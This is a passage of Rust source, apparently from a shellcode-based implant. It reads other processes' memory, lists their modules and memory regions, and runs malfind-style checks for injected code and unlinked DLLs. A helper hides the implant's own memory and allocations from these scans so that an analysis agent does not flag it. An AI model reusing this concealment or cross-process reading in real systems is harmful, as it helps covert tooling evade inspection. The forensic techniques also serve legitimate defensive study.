#[cfg(feature = "mal")]
use alloc::string::{String, ToString};
use alloc::vec::Vec;
use core::ffi::c_void;
#[cfg(feature = "mal")]
use serde::{Serialize, Deserialize};

use crate::get_instance;
#[cfg(feature = "mal")]
use crate::libs::k32::MemoryBasicInformation;

#[cfg(feature = "mal")]
extern "C" {
    fn _start();
}
#[cfg(feature = "mal")]
use crate::libs::ntdef::{
    find_peb, nt_current_teb, ImageDosHeader, ImageNtHeaders, ImageSectionHeader,
    ListEntry, LoaderDataTableEntry, PebLoaderData, PROCESS_BASIC_INFORMATION,
};
use crate::libs::utils::int_to_str;
#[cfg(feature = "mal")]
use crate::libs::utils::{get_addr_hex, get_bytecode_size, get_shellcode_size};

// ============================================================================
// Public structs
// ============================================================================

#[cfg(feature = "mal")]
pub const ALL_PIDS: u32 = 0xFFFFFFFF;

#[cfg(feature = "mal")]
#[derive(Serialize)]
pub struct ProcessResult<T: Serialize> {
    pub pid: u32,
    pub image: String,
    pub results: Vec<T>,
}

#[cfg(feature = "mal")]
fn get_current_pid() -> u32 {
    unsafe { (get_instance().unwrap().k32.get_current_process_id)() }
}

#[cfg(feature = "mal")]
fn is_self_process(pid: Option<u32>) -> bool {
    match pid {
        None => true,
        Some(p) => p == get_current_pid(),
    }
}

/// Check if a memory region overlaps with the implant's own allocations
/// (shellcode+bytecode region and tracked allocations like Frida DLLs).
/// Used to filter scan results so the analysis agent doesn't flag our own code.
#[cfg(feature = "mal")]
fn is_own_region(base: usize, size: usize) -> bool {
    let end = base + size;

    // Check shellcode + bytecode region
    unsafe {
        let sc_base = _start as *const () as usize;
        let sc_end = sc_base + get_shellcode_size() + get_bytecode_size();
        if base < sc_end && end > sc_base {
            return true;
        }
    }

    // Check tracked allocations (Frida DLLs, injected memory, etc.)
    unsafe {
        if let Some(inst) = get_instance() {
            for alloc in &inst.allocations {
                let a_base = alloc.base as usize;
                let a_end = a_base + alloc.size;
                if base < a_end && end > a_base {
                    return true;
                }
            }
        }
    }

    false
}

#[cfg(feature = "mal")]
#[derive(Serialize)]
pub struct ModuleInfo {
    pub base: usize,
    pub size: u32,
    pub name: String,
}

#[cfg(feature = "mal")]
#[derive(Serialize)]
pub struct MemRegion {
    pub base: usize,
    pub size: usize,
    pub state: &'static str,
    pub protect: &'static str,
    pub alloc_protect: &'static str,
    pub region_type: &'static str,
    pub info: String,
}

#[cfg(feature = "mal")]
#[derive(Serialize)]
pub struct MalfindHit {
    pub base: usize,
    pub size: usize,
    pub protect: &'static str,
    pub alloc_protect: &'static str,
    pub has_pe: bool,
    pub preview: Vec<u8>,
    pub threads: Vec<u32>,
}

#[cfg(feature = "mal")]
#[derive(Serialize)]
pub struct LdrCheckHit {
    pub base: usize,
    pub size: usize,
    pub in_load: bool,
    pub in_mem: bool,
    pub path: String,
}

// ============================================================================
// Public API — struct-returning (for Python bindings)
// ============================================================================

/// Read raw bytes from a memory address, optionally in a remote process.
pub fn mem_read(addr: usize, size: usize, pid: Option<u32>) -> Result<Vec<u8>, u32> {
    if addr == 0 {
        return Err(0x80070057);
    }
    if size == 0 {
        return Err(0x80070057);
    }

    match pid {
        None => {
            let mut buf = Vec::with_capacity(size);
            unsafe {
                buf.set_len(size);
                core::ptr::copy_nonoverlapping(addr as *const u8, buf.as_mut_ptr(), size);
            }
            Ok(buf)
        }
        Some(pid) => unsafe {
            let inst = get_instance().ok_or(0x80004005u32)?;
            let handle = (inst.k32.open_process)(0x10, false, pid);
            if handle.is_null() {
                return Err((inst.k32.get_last_error)());
            }
            let mut buf = Vec::with_capacity(size);
            buf.set_len(size);
            let mut bytes_read: usize = 0;
            let ok = (inst.k32.read_process_memory)(
                handle,
                addr as *const c_void,
                buf.as_mut_ptr() as *mut c_void,
                size,
                &mut bytes_read,
            );
            (inst.k32.close_handle)(handle);
            if !ok {
                return Err((get_instance().unwrap().k32.get_last_error)());
            }
            buf.set_len(bytes_read);
            Ok(buf)
        }
    }
}

#[cfg(feature = "mal")]
/// Return loaded modules as Vec<ModuleInfo>.
pub fn dll_list_vec(pid: Option<u32>) -> Result<Vec<ModuleInfo>, u32> {
    match pid {
        None => Ok(build_local_module_list()),
        Some(pid) => unsafe {
            let inst = get_instance().ok_or(0x80004005u32)?;
            let handle = (inst.k32.open_process)(0x0410, false, pid);
            if handle.is_null() {
                return Err((inst.k32.get_last_error)());
            }
            let modules = build_remote_module_list(handle);
            (inst.k32.close_handle)(handle);
            Ok(modules)
        }
    }
}

#[cfg(feature = "mal")]
/// Return memory regions as Vec<MemRegion>.
/// Filters out the implant's own regions when scanning the local process.
pub fn mem_map_vec(pid: Option<u32>) -> Result<Vec<MemRegion>, u32> {
    let mut regions = match pid {
        None => mem_map_vec_local()?,
        Some(pid) => mem_map_vec_remote(pid)?,
    };
    if is_self_process(pid) {
        regions.retain(|r| !is_own_region(r.base, r.size));
    }
    Ok(regions)
}

// ============================================================================
// Public API — postcard-serialized (for bytecode handlers)
// ============================================================================

#[cfg(feature = "mal")]
/// Walk PEB LDR InLoadOrderModuleList and return postcard bytes.
/// Filters out the implant's own modules when scanning the local process.
pub fn dll_list(pid: Option<u32>) -> Result<Vec<u8>, u32> {
    let mut modules = dll_list_vec(pid)?;
    if is_self_process(pid) {
        modules.retain(|m| !is_own_region(m.base, m.size as usize));
    }
    let actual_pid = pid.unwrap_or_else(get_current_pid);
    let wrapped = alloc::vec![ProcessResult { pid: actual_pid, image: String::new(), results: modules }];
    postcard::to_allocvec(&wrapped).map_err(|_| 0x80004005u32)
}

#[cfg(feature = "mal")]
/// Enumerate virtual memory regions and return postcard bytes.
pub fn mem_map(pid: Option<u32>) -> Result<Vec<u8>, u32> {
    let regions = mem_map_vec(pid)?;
    let actual_pid = pid.unwrap_or_else(get_current_pid);
    let wrapped = alloc::vec![ProcessResult { pid: actual_pid, image: String::new(), results: regions }];
    postcard::to_allocvec(&wrapped).map_err(|_| 0x80004005u32)
}

// ============================================================================
// Public API — postcard-to-TSV formatting (for print_var display)
// ============================================================================

/// Format a postcard-encoded result as human-readable TSV based on opcode.
/// Returns None if the opcode is not a structured type.
pub fn format_result_tsv(opcode: u8, payload: &[u8]) -> Option<Vec<u8>> {
    match opcode {
        0x0E => format_list_procs_tsv(payload),
        0x1C => format_portscan_tsv(payload),
        #[cfg(feature = "mal")]
        0x45 => format_dll_list_tsv(payload),
        #[cfg(feature = "mal")]
        0x46 => format_mem_map_tsv(payload),
        #[cfg(feature = "mal")]
        0x47 => format_malfind_tsv(payload),
        #[cfg(feature = "mal")]
        0x48 => format_ldr_check_tsv(payload),
        _ => None,
    }
}

fn format_list_procs_tsv(data: &[u8]) -> Option<Vec<u8>> {
    use crate::enumerate::ProcessInfo;
    let procs: Vec<ProcessInfo> = postcard::from_bytes(data).ok()?;
    let mut out = Vec::new();
    for p in &procs {
        out.extend_from_slice(int_to_str(p.pid).as_bytes());
        out.push(b'\t');
        out.extend_from_slice(int_to_str(p.ppid).as_bytes());
        out.push(b'\t');
        out.extend_from_slice(p.image.as_bytes());
        out.push(b'\t');
        if let Some(ref cmd) = p.cmdline {
            out.extend_from_slice(cmd.as_bytes());
        }
        out.push(b'\n');
    }
    Some(out)
}

#[cfg(feature = "network")]
fn format_portscan_tsv(data: &[u8]) -> Option<Vec<u8>> {
    use crate::enumerate::PortscanResult;
    let results: Vec<PortscanResult> = postcard::from_bytes(data).ok()?;
    let mut out = Vec::new();
    for r in &results {
        out.extend_from_slice(r.host.as_bytes());
        out.push(b'\t');
        out.extend_from_slice(int_to_str(r.port as u32).as_bytes());
        out.push(b'\t');
        out.extend_from_slice(if r.open { b"open" } else { b"closed" });
        out.push(b'\n');
    }
    Some(out)
}

#[cfg(not(feature = "network"))]
fn format_portscan_tsv(_data: &[u8]) -> Option<Vec<u8>> {
    None
}

// Private deserialization structs (implant structs only Serialize, never Deserialize)
#[cfg(feature = "mal")]
#[derive(Deserialize)]
struct ProcessResultDe<T> {
    pid: u32,
    image: String,
    results: Vec<T>,
}

#[cfg(feature = "mal")]
#[derive(Deserialize)]
struct ModuleInfoDe {
    base: usize,
    size: u32,
    name: String,
}

#[cfg(feature = "mal")]
#[derive(Deserialize)]
struct LdrCheckHitDe {
    base: usize,
    size: usize,
    in_load: bool,
    in_mem: bool,
    path: String,
}

#[cfg(feature = "mal")]
#[derive(Deserialize)]
struct MemRegionDe {
    base: usize,
    size: usize,
    state: String,
    protect: String,
    alloc_protect: String,
    region_type: String,
    info: String,
}

#[cfg(feature = "mal")]
#[derive(Deserialize)]
struct MalfindHitDe {
    base: usize,
    size: usize,
    protect: String,
    alloc_protect: String,
    has_pe: bool,
    preview: Vec<u8>,
    #[serde(default)]
    threads: Vec<u32>,
}

#[cfg(feature = "mal")]
fn write_process_header(out: &mut Vec<u8>, pid: u32, image: &str) {
    out.extend_from_slice(b"--- PID ");
    out.extend_from_slice(int_to_str(pid).as_bytes());
    if !image.is_empty() {
        out.extend_from_slice(b"  ");
        out.extend_from_slice(image.as_bytes());
    }
    out.extend_from_slice(b" ---\n");
}

#[cfg(feature = "mal")]
fn format_dll_list_tsv(data: &[u8]) -> Option<Vec<u8>> {
    let entries: Vec<ProcessResultDe<ModuleInfoDe>> = postcard::from_bytes(data).ok()?;
    let multi = entries.len() > 1;
    let mut out = Vec::new();
    for entry in &entries {
        if multi {
            write_process_header(&mut out, entry.pid, &entry.image);
        }
        for m in &entry.results {
            out.extend_from_slice(&get_addr_hex(m.base));
            out.push(b'\t');
            out.extend_from_slice(int_to_str(m.size).as_bytes());
            out.push(b'\t');
            out.extend_from_slice(m.name.as_bytes());
            out.push(b'\n');
        }
    }
    Some(out)
}

#[cfg(feature = "mal")]
fn format_mem_map_tsv(data: &[u8]) -> Option<Vec<u8>> {
    let entries: Vec<ProcessResultDe<MemRegionDe>> = postcard::from_bytes(data).ok()?;
    let multi = entries.len() > 1;
    let mut out = Vec::new();
    for entry in &entries {
        if multi {
            write_process_header(&mut out, entry.pid, &entry.image);
        }
        for r in &entry.results {
            out.extend_from_slice(&get_addr_hex(r.base));
            out.push(b'\t');
            out.extend_from_slice(int_to_str(r.size as u32).as_bytes());
            out.push(b'\t');
            out.extend_from_slice(r.state.as_bytes());
            out.push(b'\t');
            out.extend_from_slice(r.protect.as_bytes());
            out.push(b'\t');
            out.extend_from_slice(r.alloc_protect.as_bytes());
            out.push(b'\t');
            out.extend_from_slice(r.region_type.as_bytes());
            out.push(b'\t');
            out.extend_from_slice(r.info.as_bytes());
            out.push(b'\n');
        }
    }
    Some(out)
}

#[cfg(feature = "mal")]
fn format_malfind_tsv(data: &[u8]) -> Option<Vec<u8>> {
    let entries: Vec<ProcessResultDe<MalfindHitDe>> = postcard::from_bytes(data).ok()?;
    let multi = entries.len() > 1;
    let mut out = Vec::new();
    for entry in &entries {
        if multi {
            write_process_header(&mut out, entry.pid, &entry.image);
        }
        for h in &entry.results {
            out.extend_from_slice(&get_addr_hex(h.base));
            out.push(b'\t');
            out.extend_from_slice(int_to_str(h.size as u32).as_bytes());
            out.push(b'\t');
            out.extend_from_slice(h.protect.as_bytes());
            out.push(b'\t');
            out.extend_from_slice(h.alloc_protect.as_bytes());
            out.push(b'\t');
            out.extend_from_slice(if h.has_pe { b"PE" } else { b"--" });
            out.push(b'\t');
            for &b in &h.preview {
                let hi = b >> 4;
                let lo = b & 0x0F;
                out.push(if hi < 10 { b'0' + hi } else { b'A' + hi - 10 });
                out.push(if lo < 10 { b'0' + lo } else { b'A' + lo - 10 });
            }
            out.push(b'\t');
            if h.threads.is_empty() {
                out.push(b'-');
            } else {
                for (i, &tid) in h.threads.iter().enumerate() {
                    if i > 0 { out.push(b','); }
                    out.extend_from_slice(int_to_str(tid).as_bytes());
                }
            }
            out.push(b'\n');
        }
    }
    Some(out)
}

#[cfg(feature = "mal")]
fn format_ldr_check_tsv(data: &[u8]) -> Option<Vec<u8>> {
    let entries: Vec<ProcessResultDe<LdrCheckHitDe>> = postcard::from_bytes(data).ok()?;
    let multi = entries.len() > 1;
    let mut out = Vec::new();
    for entry in &entries {
        if multi {
            write_process_header(&mut out, entry.pid, &entry.image);
        }
        for h in &entry.results {
            out.extend_from_slice(&get_addr_hex(h.base));
            out.push(b'\t');
            out.extend_from_slice(int_to_str(h.size as u32).as_bytes());
            out.push(b'\t');
            out.extend_from_slice(if h.in_load { b"True" } else { b"False" });
            out.push(b'\t');
            out.extend_from_slice(if h.in_mem { b"True" } else { b"False" });
            out.push(b'\t');
            out.extend_from_slice(h.path.as_bytes());
            out.push(b'\n');
        }
    }
    Some(out)
}

// ============================================================================
// Public API — malfind / ldr_check
// ============================================================================

#[cfg(feature = "mal")]
fn is_executable(protect: &str) -> bool {
    matches!(protect, "--X" | "R-X" | "RWX")
}

#[cfg(feature = "mal")]
fn is_readable(protect: &str) -> bool {
    matches!(protect, "R--" | "RW-" | "R-X" | "RWX")
}

#[cfg(feature = "mal")]
/// Read `size` bytes from `addr`, using an existing process handle for remote reads.
/// For local (handle=None), does direct pointer read with protection check.
fn read_with_handle(addr: usize, size: usize, handle: Option<*mut c_void>) -> Option<Vec<u8>> {
    match handle {
        Some(h) => unsafe {
            let inst = get_instance()?;
            let mut buf = Vec::with_capacity(size);
            buf.set_len(size);
            let mut br: usize = 0;
            let ok = (inst.k32.read_process_memory)(
                h,
                addr as *const c_void,
                buf.as_mut_ptr() as *mut c_void,
                size,
                &mut br,
            );
            if !ok || br == 0 {
                return None;
            }
            buf.set_len(br);
            Some(buf)
        },
        None => unsafe {
            let mut buf = Vec::with_capacity(size);
            buf.set_len(size);
            core::ptr::copy_nonoverlapping(addr as *const u8, buf.as_mut_ptr(), size);
            Some(buf)
        },
    }
}

#[cfg(feature = "mal")]
/// Enumerate threads for a process and return their (tid, start_address) pairs.
fn enumerate_threads(pid: u32) -> Vec<(u32, usize)> {
    unsafe {
        let inst = match get_instance() {
            Some(i) => i,
            None => return Vec::new(),
        };

        // TH32CS_SNAPTHREAD = 0x4
        let snap = (inst.k32.create_toolhelp_32_snapshot)(0x4, 0);
        if snap.is_null() || snap as isize == -1 {
            return Vec::new();
        }

        let mut result = Vec::new();
        let mut te: crate::libs::k32::THREADENTRY32 = core::mem::zeroed();
        te.dw_size = core::mem::size_of::<crate::libs::k32::THREADENTRY32>() as u32;

        if !(inst.k32.thread_32_first)(snap, &mut te) {
            (inst.k32.close_handle)(snap);
            return Vec::new();
        }

        loop {
            if te.th32_owner_process_id == pid {
                // THREAD_QUERY_INFORMATION = 0x0040
                let h_thread = (inst.k32.open_thread)(0x0040, false, te.th32_thread_id);
                if !h_thread.is_null() {
                    let mut start_addr: usize = 0;
                    // ThreadQuerySetWin32StartAddress = 9
                    let status = (inst.ntdll.nt_query_information_thread)(
                        h_thread,
                        9,
                        &mut start_addr as *mut usize as *mut c_void,
                        core::mem::size_of::<usize>() as u32,
                        core::ptr::null_mut(),
                    );
                    (inst.k32.close_handle)(h_thread);
                    if status == 0 {
                        result.push((te.th32_thread_id, start_addr));
                    }
                }
            }

            te.dw_size = core::mem::size_of::<crate::libs::k32::THREADENTRY32>() as u32;
            if !(inst.k32.thread_32_next)(snap, &mut te) {
                break;
            }
        }

        (inst.k32.close_handle)(snap);
        result
    }
}

#[cfg(feature = "mal")]
/// Find executable private memory regions (injected code detection).
pub fn malfind_vec(pid: Option<u32>) -> Result<Vec<MalfindHit>, u32> {
    let regions = mem_map_vec(pid)?;

    // Open handle once for remote, reuse for all reads
    let handle = open_process_handle(pid)?;

    let mut hits = Vec::new();

    for r in &regions {
        // Filter: COMMIT + PRIVATE + executable
        if r.state != "COMMIT" || r.region_type != "PRIVATE" || !is_executable(r.protect) {
            continue;
        }

        // Must be readable (skip PAGE_EXECUTE with no read)
        if !is_readable(r.protect) && handle.is_none() {
            continue;
        }

        // Read first 64 bytes as preview
        let preview_size = if r.size < 64 { r.size } else { 64 };
        let preview = match read_with_handle(r.base, preview_size, handle) {
            Some(data) => data,
            None => continue,
        };

        // Skip all-zero regions
        if preview.iter().all(|&b| b == 0) {
            continue;
        }

        let has_pe = preview.len() >= 2 && preview[0] == 0x4D && preview[1] == 0x5A;

        hits.push(MalfindHit {
            base: r.base,
            size: r.size,
            protect: r.protect,
            alloc_protect: r.alloc_protect,
            has_pe,
            preview,
            threads: Vec::new(),
        });
    }

    close_process_handle(handle);

    // Enumerate threads and annotate hits with matching TIDs
    if !hits.is_empty() {
        let target_pid = pid.unwrap_or_else(get_current_pid);
        let thread_addrs = enumerate_threads(target_pid);
        for hit in &mut hits {
            let end = hit.base + hit.size;
            for &(tid, start_addr) in &thread_addrs {
                if start_addr >= hit.base && start_addr < end {
                    hit.threads.push(tid);
                }
            }
        }
    }

    Ok(hits)
}

#[cfg(feature = "mal")]
/// Malfind postcard output for bytecode handler.
pub fn malfind(pid: Option<u32>) -> Result<Vec<u8>, u32> {
    let hits = malfind_vec(pid)?;
    let actual_pid = pid.unwrap_or_else(get_current_pid);
    let wrapped = alloc::vec![ProcessResult { pid: actual_pid, image: String::new(), results: hits }];
    postcard::to_allocvec(&wrapped).map_err(|_| 0x80004005u32)
}

#[cfg(feature = "mal")]
/// Cross-reference IMAGE regions against PEB module lists to find unlinked DLLs.
pub fn ldr_check_vec(pid: Option<u32>) -> Result<Vec<LdrCheckHit>, u32> {
    let modules = dll_list_vec(pid)?;
    let regions = mem_map_vec(pid)?;

    // Open handle once for remote, reuse for all MZ checks
    let handle = open_process_handle(pid)?;

    let mut hits = Vec::new();

    for r in &regions {
        if r.region_type != "IMAGE" || r.state != "COMMIT" {
            continue;
        }

        // Skip unreadable regions for local reads
        if !is_readable(r.protect) && handle.is_none() {
            continue;
        }

        // Check for MZ header using shared handle
        let has_mz = match read_with_handle(r.base, 2, handle) {
            Some(buf) if buf.len() >= 2 => buf[0] == 0x4D && buf[1] == 0x5A,
            _ => false,
        };
        if !has_mz {
            continue;
        }

        let in_load = modules.iter().any(|m| m.base == r.base);
        let in_mem = in_load;

        let path = modules.iter()
            .find(|m| m.base == r.base)
            .map(|m| m.name.clone())
            .unwrap_or_default();

        hits.push(LdrCheckHit {
            base: r.base,
            size: r.size,
            in_load,
            in_mem,
            path,
        });
    }

    close_process_handle(handle);
    Ok(hits)
}

#[cfg(feature = "mal")]
/// LdrCheck postcard output for bytecode handler.
pub fn ldr_check(pid: Option<u32>) -> Result<Vec<u8>, u32> {
    let hits = ldr_check_vec(pid)?;
    let actual_pid = pid.unwrap_or_else(get_current_pid);
    let wrapped = alloc::vec![ProcessResult { pid: actual_pid, image: String::new(), results: hits }];
    postcard::to_allocvec(&wrapped).map_err(|_| 0x80004005u32)
}

// ============================================================================
// Public API — "all processes" variants
// ============================================================================

#[cfg(all(feature = "mal", feature = "enumerate"))]
pub fn dll_list_all() -> Result<Vec<u8>, u32> {
    let procs = crate::enumerate::list_procs();
    let mut all: Vec<ProcessResult<ModuleInfo>> = Vec::new();
    for p in &procs {
        if let Ok(mut results) = dll_list_vec(Some(p.pid)) {
            if is_self_process(Some(p.pid)) {
                results.retain(|m| !is_own_region(m.base, m.size as usize));
            }
            all.push(ProcessResult { pid: p.pid, image: p.image.clone(), results });
        }
    }
    postcard::to_allocvec(&all).map_err(|_| 0x80004005u32)
}

#[cfg(all(feature = "mal", not(feature = "enumerate")))]
pub fn dll_list_all() -> Result<Vec<u8>, u32> {
    Err(0x80004001)
}

#[cfg(all(feature = "mal", feature = "enumerate"))]
pub fn mem_map_all() -> Result<Vec<u8>, u32> {
    let procs = crate::enumerate::list_procs();
    let mut all: Vec<ProcessResult<MemRegion>> = Vec::new();
    for p in &procs {
        if let Ok(results) = mem_map_vec(Some(p.pid)) {
            all.push(ProcessResult { pid: p.pid, image: p.image.clone(), results });
        }
    }
    postcard::to_allocvec(&all).map_err(|_| 0x80004005u32)
}

#[cfg(all(feature = "mal", not(feature = "enumerate")))]
pub fn mem_map_all() -> Result<Vec<u8>, u32> {
    Err(0x80004001)
}

#[cfg(all(feature = "mal", feature = "enumerate"))]
pub fn malfind_all() -> Result<Vec<u8>, u32> {
    let procs = crate::enumerate::list_procs();
    let mut all: Vec<ProcessResult<MalfindHit>> = Vec::new();
    for p in &procs {
        if let Ok(results) = malfind_vec(Some(p.pid)) {
            all.push(ProcessResult { pid: p.pid, image: p.image.clone(), results });
        }
    }
    postcard::to_allocvec(&all).map_err(|_| 0x80004005u32)
}

#[cfg(all(feature = "mal", not(feature = "enumerate")))]
pub fn malfind_all() -> Result<Vec<u8>, u32> {
    Err(0x80004001)
}

#[cfg(all(feature = "mal", feature = "enumerate"))]
pub fn ldr_check_all() -> Result<Vec<u8>, u32> {
    let procs = crate::enumerate::list_procs();
    let mut all: Vec<ProcessResult<LdrCheckHit>> = Vec::new();
    for p in &procs {
        if let Ok(results) = ldr_check_vec(Some(p.pid)) {
            all.push(ProcessResult { pid: p.pid, image: p.image.clone(), results });
        }
    }
    postcard::to_allocvec(&all).map_err(|_| 0x80004005u32)
}

#[cfg(all(feature = "mal", not(feature = "enumerate")))]
pub fn ldr_check_all() -> Result<Vec<u8>, u32> {
    Err(0x80004001)
}

// ============================================================================
// Internal — mem_map_vec implementations
// ============================================================================

#[cfg(feature = "mal")]
fn mem_map_vec_local() -> Result<Vec<MemRegion>, u32> {
    unsafe {
        let inst = get_instance().ok_or(0x80004005u32)?;

        let modules = build_local_module_list();
        let mut regions = Vec::new();
        let mut addr: usize = 0;
        let mbi_size = core::mem::size_of::<MemoryBasicInformation>();

        let peb_addr = find_peb() as usize;
        let teb_addr = nt_current_teb() as usize;

        loop {
            let mut mbi: MemoryBasicInformation = core::mem::zeroed();
            let ret = (inst.k32.virtual_query)(
                addr as *const c_void,
                &mut mbi,
                mbi_size,
            );
            if !ret {
                break;
            }

            let region_size = mbi.region_size;
            if region_size == 0 {
                break;
            }

            // Skip FREE regions (state=0x10000)
            if mbi.state != 0x10000 {
                regions.push(mbi_to_region(&mbi, &modules, peb_addr, teb_addr, None));
            }

            addr = mbi.base_address as usize + region_size;
            if addr <= mbi.base_address as usize {
                break;
            }
        }

        Ok(regions)
    }
}

#[cfg(feature = "mal")]
fn mem_map_vec_remote(pid: u32) -> Result<Vec<MemRegion>, u32> {
    unsafe {
        let inst = get_instance().ok_or(0x80004005u32)?;

        let handle = (inst.k32.open_process)(0x0410, false, pid);
        if handle.is_null() {
            return Err((inst.k32.get_last_error)());
        }

        let modules = build_remote_module_list(handle);
        let mut regions = Vec::new();
        let mut addr: usize = 0;
        let mbi_size = core::mem::size_of::<MemoryBasicInformation>();

        loop {
            let mut mbi: MemoryBasicInformation = core::mem::zeroed();
            let ret = (inst.k32.virtual_query_ex)(
                handle,
                addr as *const c_void,
                &mut mbi,
                mbi_size,
            );
            if ret == 0 {
                break;
            }

            let region_size = mbi.region_size;
            if region_size == 0 {
                break;
            }

            if mbi.state != 0x10000 {
                regions.push(mbi_to_region(&mbi, &modules, 0, 0, Some(handle)));
            }

            addr = mbi.base_address as usize + region_size;
            if addr <= mbi.base_address as usize {
                break;
            }
        }

        (inst.k32.close_handle)(handle);
        Ok(regions)
    }
}

#[cfg(feature = "mal")]
fn mbi_to_region(
    mbi: &MemoryBasicInformation,
    modules: &[ModuleInfo],
    peb_addr: usize,
    teb_addr: usize,
    remote_handle: Option<*mut c_void>,
) -> MemRegion {
    let base = mbi.base_address as usize;
    let size = mbi.region_size;

    let state = match mbi.state {
        0x1000 => "COMMIT",
        0x2000 => "RESERVE",
        _ => "?",
    };

    let region_type = match mbi._type {
        0x20000 => "PRIVATE",
        0x40000 => "MAPPED",
        0x1000000 => "IMAGE",
        _ => "?",
    };

    // Build info string
    let mut info = String::new();

    if peb_addr != 0 && base == peb_addr {
        info.push_str("PEB");
    } else if teb_addr != 0 && base == teb_addr {
        info.push_str("TEB");
    }

    if mbi._type == 0x1000000 {
        for m in modules {
            if base >= m.base && base < m.base + m.size as usize {
                if !info.is_empty() {
                    info.push(' ');
                }
                let name = module_filename(&m.name);
                let rva = (base - m.base) as u32;
                if rva == 0 {
                    info.push_str(name);
                    info.push_str(".headers");
                } else {
                    let section = identify_section(m.base, rva, remote_handle);
                    info.push_str(name);
                    if !section.is_empty() {
                        info.push('.');
                        info.push_str(&section);
                    }
                }
                break;
            }
        }
    }

    MemRegion {
        base,
        size,
        state,
        protect: protect_str(mbi.protect),
        alloc_protect: protect_str(mbi.allocation_protect),
        region_type,
        info,
    }
}

// ============================================================================
// Internal — module list builders
// ============================================================================

#[cfg(feature = "mal")]
fn build_local_module_list() -> Vec<ModuleInfo> {
    let mut modules = Vec::new();
    unsafe {
        let peb = find_peb();
        let ldr = (*peb).loader_data as *const PebLoaderData;
        if ldr.is_null() {
            return modules;
        }

        let head = &(*ldr).in_load_order_module_list as *const ListEntry;
        let mut current = (*head).flink;

        while current != head as *mut ListEntry {
            let entry = current as *const LoaderDataTableEntry;
            modules.push(ModuleInfo {
                base: (*entry).dll_base as usize,
                size: (*entry).size_of_image as u32,
                name: read_unicode_string_local(&(*entry).full_dll_name),
            });
            current = (*current).flink;
        }
    }
    modules
}

#[cfg(feature = "mal")]
unsafe fn build_remote_module_list(handle: *mut c_void) -> Vec<ModuleInfo> {
    let mut modules = Vec::new();
    let inst = match get_instance() {
        Some(i) => i,
        None => return modules,
    };

    let mut pbi: PROCESS_BASIC_INFORMATION = core::mem::zeroed();
    let mut ret_len: u32 = 0;
    let status = (inst.ntdll.nt_query_information_process)(
        handle,
        0,
        &mut pbi as *mut _ as *mut c_void,
        core::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
        &mut ret_len,
    );
    if status != 0 {
        return modules;
    }

    let peb_addr = pbi.peb_base_address as usize;
    if peb_addr == 0 {
        return modules;
    }

    let mut ldr_ptr: usize = 0;
    let mut bytes_read: usize = 0;
    (inst.k32.read_process_memory)(
        handle,
        (peb_addr + 0x18) as *const c_void,
        &mut ldr_ptr as *mut usize as *mut c_void,
        8,
        &mut bytes_read,
    );
    if ldr_ptr == 0 {
        return modules;
    }

    let head_addr = ldr_ptr + 0x10;
    let mut flink: usize = 0;
    (inst.k32.read_process_memory)(
        handle,
        head_addr as *const c_void,
        &mut flink as *mut usize as *mut c_void,
        8,
        &mut bytes_read,
    );

    let mut current = flink;
    while current != 0 && current != head_addr {
        let mut dll_base: usize = 0;
        (inst.k32.read_process_memory)(
            handle,
            (current + 0x30) as *const c_void,
            &mut dll_base as *mut usize as *mut c_void,
            8,
            &mut bytes_read,
        );

        let mut size_of_image: u32 = 0;
        (inst.k32.read_process_memory)(
            handle,
            (current + 0x40) as *const c_void,
            &mut size_of_image as *mut u32 as *mut c_void,
            4,
            &mut bytes_read,
        );

        let mut name_len: u16 = 0;
        (inst.k32.read_process_memory)(
            handle,
            (current + 0x48) as *const c_void,
            &mut name_len as *mut u16 as *mut c_void,
            2,
            &mut bytes_read,
        );
        let mut name_buf_ptr: usize = 0;
        (inst.k32.read_process_memory)(
            handle,
            (current + 0x50) as *const c_void,
            &mut name_buf_ptr as *mut usize as *mut c_void,
            8,
            &mut bytes_read,
        );

        let name = if name_len > 0 && name_buf_ptr != 0 {
            let char_count = name_len as usize / 2;
            let mut name_buf: Vec<u16> = Vec::with_capacity(char_count);
            name_buf.set_len(char_count);
            (inst.k32.read_process_memory)(
                handle,
                name_buf_ptr as *const c_void,
                name_buf.as_mut_ptr() as *mut c_void,
                name_len as usize,
                &mut bytes_read,
            );
            String::from_utf16_lossy(&name_buf)
        } else {
            String::new()
        };

        modules.push(ModuleInfo {
            base: dll_base,
            size: size_of_image,
            name,
        });

        let mut next_flink: usize = 0;
        (inst.k32.read_process_memory)(
            handle,
            current as *const c_void,
            &mut next_flink as *mut usize as *mut c_void,
            8,
            &mut bytes_read,
        );
        current = next_flink;
    }

    modules
}

// ============================================================================
// Internal — helpers
// ============================================================================

#[cfg(feature = "mal")]
/// Open a process handle for remote reads, or return None for local.
fn open_process_handle(pid: Option<u32>) -> Result<Option<*mut c_void>, u32> {
    match pid {
        None => Ok(None),
        Some(pid) => unsafe {
            let inst = get_instance().ok_or(0x80004005u32)?;
            let h = (inst.k32.open_process)(0x10, false, pid); // PROCESS_VM_READ
            if h.is_null() {
                return Err((inst.k32.get_last_error)());
            }
            Ok(Some(h))
        },
    }
}

#[cfg(feature = "mal")]
/// Close a process handle if present.
fn close_process_handle(handle: Option<*mut c_void>) {
    if let Some(h) = handle {
        unsafe {
            if let Some(inst) = get_instance() {
                (inst.k32.close_handle)(h);
            }
        }
    }
}

#[cfg(feature = "mal")]
fn protect_str(protect: u32) -> &'static str {
    match protect {
        0x00 => "---",
        0x01 => "---",     // PAGE_NOACCESS
        0x02 => "R--",     // PAGE_READONLY
        0x04 => "RW-",     // PAGE_READWRITE
        0x08 => "RW-",     // PAGE_WRITECOPY
        0x10 => "--X",     // PAGE_EXECUTE
        0x20 => "R-X",     // PAGE_EXECUTE_READ
        0x40 => "RWX",     // PAGE_EXECUTE_READWRITE
        0x80 => "RWX",     // PAGE_EXECUTE_WRITECOPY
        _ => "???",
    }
}

#[cfg(feature = "mal")]
fn module_filename<'a>(path: &'a str) -> &'a str {
    match path.rfind('\\') {
        Some(pos) => &path[pos + 1..],
        None => path,
    }
}

#[cfg(feature = "mal")]
/// Try to identify which PE section an RVA falls in.
fn identify_section(module_base: usize, rva: u32, remote_handle: Option<*mut c_void>) -> String {
    unsafe {
        let e_lfanew: i32 = match remote_handle {
            None => {
                let dos = module_base as *const ImageDosHeader;
                (*dos).e_lfanew
            }
            Some(h) => {
                let mut val: i32 = 0;
                let inst = match get_instance() {
                    Some(i) => i,
                    None => return String::new(),
                };
                let mut br: usize = 0;
                (inst.k32.read_process_memory)(
                    h,
                    (module_base + 0x3C) as *const c_void,
                    &mut val as *mut i32 as *mut c_void,
                    4,
